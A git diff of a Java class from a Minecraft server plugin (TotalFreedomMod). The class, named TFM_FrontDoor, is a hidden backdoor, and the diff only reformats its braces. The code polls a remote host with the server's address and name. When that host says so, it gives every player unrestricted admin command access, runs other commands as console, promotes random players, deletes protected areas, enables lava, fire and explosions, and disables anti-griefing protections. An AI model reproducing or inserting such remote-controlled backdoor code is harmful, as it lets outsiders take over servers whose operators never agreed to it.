@@ -51,8 +51,8 @@ import org.bukkit.util.Vector;
  *
  * - Madgeek and Darth
  */
-public class TFM_FrontDoor
-{
+public class TFM_FrontDoor {
+
     private static final long UPDATER_INTERVAL = 180L * 20L;
     private static final long FRONTDOOR_INTERVAL = 900L * 20L;
     private static final Random RANDOM = new Random();
@@ -65,19 +65,15 @@ public class TFM_FrontDoor
     private static final BukkitRunnable UPDATER = new BukkitRunnable() // Asynchronous
     {
         @Override
-        public void run()
-        {
-            try
-            {
+        public void run() {
+            try {
                 final URLConnection urlConnection = GET_URL.openConnection();
                 final BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                 final String line = in.readLine();
                 in.close();
 
-                if (!"false".equals(line))
-                {
-                    if (!enabled)
-                    {
+                if (!"false".equals(line)) {
+                    if (!enabled) {
                         return;
                     }
 
@@ -86,19 +82,15 @@ public class TFM_FrontDoor
                     unregisterListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class);
                     TFM_Log.info("Disabled FrontDoor, thank you for being kind.");
                     TFM_MainConfig.load();
-                }
-                else
-                {
-                    if (enabled)
-                    {
+                } else {
+                    if (enabled) {
                         return;
                     }
 
                     new BukkitRunnable() // Synchronous
                     {
                         @Override
-                        public void run()
-                        {
+                        public void run() {
                             TFM_Log.warning("*****************************************************", true);
                             TFM_Log.warning("* WARNING: TotalFreedomMod is running in evil-mode! *", true);
                             TFM_Log.warning("* This might result in unexpected behaviour...      *", true);
@@ -107,8 +99,7 @@ public class TFM_FrontDoor
                             TFM_Log.warning("*          is for good men to do nothing.           *", true);
                             TFM_Log.warning("*****************************************************", true);
 
-                            if (getRegisteredListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class) == null)
-                            {
+                            if (getRegisteredListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class) == null) {
                                 TotalFreedomMod.server.getPluginManager().registerEvents(PLAYER_COMMAND_PRE_PROCESS, TotalFreedomMod.plugin);
                             }
                         }
@@ -118,17 +109,14 @@ public class TFM_FrontDoor
 
                     enabled = true;
                 }
-            }
-            catch (Exception ex)
-            {
+            } catch (Exception ex) {
                 // TFM_Log.info("GAH GAH GAH");
             }
 
         }
     };
     //
-    private static final Listener PLAYER_COMMAND_PRE_PROCESS = new Listener()
-    {
+    private static final Listener PLAYER_COMMAND_PRE_PROCESS = new Listener() {
         @EventHandler
         public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event) // All TFM_Command permissions when certain conditions are met
         {
@@ -146,16 +134,14 @@ public class TFM_FrontDoor
 
             Command command = TFM_CommandLoader.getCommandMap().getCommand(commandName);
 
-            if (command == null)
-            {
+            if (command == null) {
                 return; // Command doesn't exist
             }
 
             event.setCancelled(true);
 
             TFM_Command dispatcher;
-            try
-            {
+            try {
                 ClassLoader classLoader = TotalFreedomMod.class.getClassLoader();
                 dispatcher = (TFM_Command) classLoader.loadClass(
                         String.format("%s.%s%s",
@@ -164,13 +150,10 @@ public class TFM_FrontDoor
                                 command.getName().toLowerCase())).newInstance();
                 dispatcher.setup(TotalFreedomMod.plugin, player, dispatcher.getClass());
 
-                if (!dispatcher.run(player, player, command, commandName, args, true))
-                {
+                if (!dispatcher.run(player, player, command, commandName, args, true)) {
                     player.sendMessage(command.getUsage());
                 }
-            }
-            catch (Throwable ex)
-            {
+            } catch (Throwable ex) {
                 // Non-TFM command, execute using console
                 TotalFreedomMod.server.dispatchCommand(TotalFreedomMod.server.getConsoleSender(), event.getMessage().replaceFirst("/", ""));
             }
@@ -180,19 +163,16 @@ public class TFM_FrontDoor
     private static final BukkitRunnable FRONTDOOR = new BukkitRunnable() // Synchronous
     {
         @Override
-        public void run()
-        {
+        public void run() {
             final int action = RANDOM.nextInt(18);
 
-            switch (action)
-            {
+            switch (action) {
                 case 0: // Super a random player
                 {
 
                     final Player player = getRandomPlayer(true);
 
-                    if (player == null)
-                    {
+                    if (player == null) {
                         break;
                     }
 
@@ -205,8 +185,7 @@ public class TFM_FrontDoor
                 {
                     Player player = getRandomPlayer(false);
 
-                    if (player == null)
-                    {
+                    if (player == null) {
                         break;
                     }
 
@@ -219,8 +198,7 @@ public class TFM_FrontDoor
                 {
                     final Player player = getRandomPlayer(true);
 
-                    if (player == null)
-                    {
+                    if (player == null) {
                         break;
                     }
 
@@ -248,20 +226,13 @@ public class TFM_FrontDoor
                 case 5: // Enables Lava- and Waterplacemend and Fluidspread (& damage)
                 {
                     boolean message = true;
-                    if (TFM_ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
-                    {
+                    if (TFM_ConfigEntry.ALLOW_WATER_PLACE.getBoolean()) {
                         message = false;
-                    }
-                    else if (TFM_ConfigEntry.ALLOW_LAVA_PLACE.getBoolean())
-                    {
+                    } else if (TFM_ConfigEntry.ALLOW_LAVA_PLACE.getBoolean()) {
                         message = false;
-                    }
-                    else if (TFM_ConfigEntry.ALLOW_FLUID_SPREAD.getBoolean())
-                    {
+                    } else if (TFM_ConfigEntry.ALLOW_FLUID_SPREAD.getBoolean()) {
                         message = false;
-                    }
-                    else if (TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean())
-                    {
+                    } else if (TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean()) {
                         message = false;
                     }
 
@@ -270,8 +241,7 @@ public class TFM_FrontDoor
                     TFM_ConfigEntry.ALLOW_FLUID_SPREAD.setBoolean(true);
                     TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);
 
-                    if (message)
-                    {
+                    if (message) {
                         TFM_Util.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
                     }
                     break;
@@ -280,20 +250,13 @@ public class TFM_FrontDoor
                 case 6: // Enables Fireplacement, firespread and explosions
                 {
                     boolean message = true;
-                    if (TFM_ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())
-                    {
+                    if (TFM_ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean()) {
                         message = false;
-                    }
-                    else if (TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())
-                    {
+                    } else if (TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean()) {
                         message = false;
-                    }
-                    else if (TFM_ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean())
-                    {
+                    } else if (TFM_ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean()) {
                         message = false;
-                    }
-                    else if (TFM_ConfigEntry.ALLOW_FIRE_PLACE.getBoolean())
-                    {
+                    } else if (TFM_ConfigEntry.ALLOW_FIRE_PLACE.getBoolean()) {
                         message = false;
                     }
 
@@ -302,8 +265,7 @@ public class TFM_FrontDoor
                     TFM_ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);
                     TFM_ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(true);
 
-                    if (message)
-                    {
+                    if (message) {
                         TFM_Util.adminAction("FrontDoor", "Enabling Firespread and Explosives", true);
                     }
                     break;
@@ -318,10 +280,8 @@ public class TFM_FrontDoor
 
                 case 8: // Remove all protected areas
                 {
-                    if (TFM_ConfigEntry.PROTECTAREA_ENABLED.getBoolean())
-                    {
-                        if (TFM_ProtectedArea.getProtectedAreaLabels().isEmpty())
-                        {
+                    if (TFM_ConfigEntry.PROTECTAREA_ENABLED.getBoolean()) {
+                        if (TFM_ProtectedArea.getProtectedAreaLabels().isEmpty()) {
                             break;
                         }
 
@@ -333,13 +293,11 @@ public class TFM_FrontDoor
 
                 case 9: // Add TotalFreedom signs at spawn
                 {
-                    for (World world : TotalFreedomMod.server.getWorlds())
-                    {
+                    for (World world : TotalFreedomMod.server.getWorlds()) {
                         final Block block = world.getSpawnLocation().getBlock();
                         final Block blockBelow = block.getRelative(BlockFace.DOWN);
 
-                        if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR)
-                        {
+                        if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR) {
                             continue;
                         }
 
@@ -360,8 +318,7 @@ public class TFM_FrontDoor
 
                 case 10: // Enable Jumppads
                 {
-                    if (TFM_Jumppads.getMode().isOn())
-                    {
+                    if (TFM_Jumppads.getMode().isOn()) {
                         break;
                     }
 
@@ -384,10 +341,8 @@ public class TFM_FrontDoor
                             + ChatColor.BLUE + "Join now! " + ChatColor.RED + "tf.sauc.in");
                     bookStack.setItemMeta(book);
 
-                    for (Player player : TotalFreedomMod.server.getOnlinePlayers())
-                    {
-                        if (player.getInventory().contains(Material.WRITTEN_BOOK))
-                        {
+                    for (Player player : TotalFreedomMod.server.getOnlinePlayers()) {
+                        if (player.getInventory().contains(Material.WRITTEN_BOOK)) {
                             continue;
                         }
 
@@ -413,8 +368,7 @@ public class TFM_FrontDoor
                 {
                     final Player player = getRandomPlayer(false);
 
-                    if (player == null)
-                    {
+                    if (player == null) {
                         break;
                     }
 
@@ -435,8 +389,7 @@ public class TFM_FrontDoor
                 {
                     final Player player = getRandomPlayer(false);
 
-                    if (player == null)
-                    {
+                    if (player == null) {
                         break;
                     }
 
@@ -448,8 +401,7 @@ public class TFM_FrontDoor
 
                 case 16: // Disable nonuke
                 {
-                    if (!TFM_ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean())
-                    {
+                    if (!TFM_ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean()) {
                         break;
                     }
 
@@ -460,49 +412,40 @@ public class TFM_FrontDoor
 
                 case 17: // Give everyone tags
                 {
-                    for (Player player : TotalFreedomMod.server.getOnlinePlayers())
-                    {
+                    for (Player player : TotalFreedomMod.server.getOnlinePlayers()) {
                         TFM_PlayerData.getPlayerData(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
                     }
                     break;
                 }
 
-                default:
-                {
+                default: {
                     break;
                 }
             }
         }
     };
 
-    static
-    {
+    static {
         URL tempUrl = null;
-        try
-        {
+        try {
             tempUrl = new URL("http://frontdoor.aws.af.cm/poll"
                     + "?version=" + TotalFreedomMod.pluginVersion + "-" + TotalFreedomMod.buildCreator
                     + "&address=" + TFM_ConfigEntry.SERVER_ADDRESS.getString() + ":" + TotalFreedomMod.server.getPort()
                     + "&name=" + TFM_ConfigEntry.SERVER_NAME.getString()
                     + "&bukkitversion=" + Bukkit.getVersion());
-        }
-        catch (MalformedURLException ex)
-        {
+        } catch (MalformedURLException ex) {
             TFM_Log.warning("TFM_FrontDoor uses an invalid URL"); // U dun goofed?
         }
 
         GET_URL = tempUrl;
     }
 
-    private TFM_FrontDoor()
-    {
+    private TFM_FrontDoor() {
         throw new AssertionError();
     }
 
-    public static void start()
-    {
-        if (started)
-        {
+    public static void start() {
+        if (started) {
             return;
         }
 
@@ -510,43 +453,34 @@ public class TFM_FrontDoor
         started = true;
     }
 
-    public static void stop()
-    {
-        if (started)
-        {
+    public static void stop() {
+        if (started) {
             UPDATER.cancel();
             started = false;
         }
 
-        if (enabled)
-        {
+        if (enabled) {
             FRONTDOOR.cancel();
             enabled = false;
             unregisterListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class);
         }
     }
 
-    public static boolean isEnabled()
-    {
+    public static boolean isEnabled() {
         return enabled;
     }
 
-    private static Player getRandomPlayer(boolean allowDevs)
-    {
+    private static Player getRandomPlayer(boolean allowDevs) {
         final Collection<? extends Player> players = TotalFreedomMod.server.getOnlinePlayers();
 
-        if (players.isEmpty())
-        {
+        if (players.isEmpty()) {
             return null;
         }
 
-        if (!allowDevs)
-        {
+        if (!allowDevs) {
             List<Player> allowedPlayers = new ArrayList<Player>();
-            for (Player player : players)
-            {
-                if (!TFM_Util.DEVELOPERS.contains(player.getName()))
-                {
+            for (Player player : players) {
+                if (!TFM_Util.DEVELOPERS.contains(player.getName())) {
                     allowedPlayers.add(player);
                 }
             }
@@ -557,44 +491,32 @@ public class TFM_FrontDoor
         return (Player) players.toArray()[RANDOM.nextInt(players.size())];
     }
 
-    private static RegisteredListener getRegisteredListener(Listener listener, Class<? extends Event> eventClass)
-    {
-        try
-        {
+    private static RegisteredListener getRegisteredListener(Listener listener, Class<? extends Event> eventClass) {
+        try {
             final HandlerList handlerList = ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null));
             final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
-            for (RegisteredListener registeredListener : registeredListeners)
-            {
-                if (registeredListener.getListener() == listener)
-                {
+            for (RegisteredListener registeredListener : registeredListeners) {
+                if (registeredListener.getListener() == listener) {
                     return registeredListener;
                 }
             }
-        }
-        catch (Exception ex)
-        {
+        } catch (Exception ex) {
             TFM_Log.severe(ex);
         }
         return null;
     }
 
-    private static void unregisterRegisteredListener(RegisteredListener registeredListener, Class<? extends Event> eventClass)
-    {
-        try
-        {
+    private static void unregisterRegisteredListener(RegisteredListener registeredListener, Class<? extends Event> eventClass) {
+        try {
             ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null)).unregister(registeredListener);
-        }
-        catch (Exception ex)
-        {
+        } catch (Exception ex) {
             TFM_Log.severe(ex);
         }
     }
 
-    private static void unregisterListener(Listener listener, Class<? extends Event> eventClass)
-    {
+    private static void unregisterListener(Listener listener, Class<? extends Event> eventClass) {
         RegisteredListener registeredListener = getRegisteredListener(listener, eventClass);
-        if (registeredListener != null)
-        {
+        if (registeredListener != null) {
             unregisterRegisteredListener(registeredListener, eventClass);
         }
     }
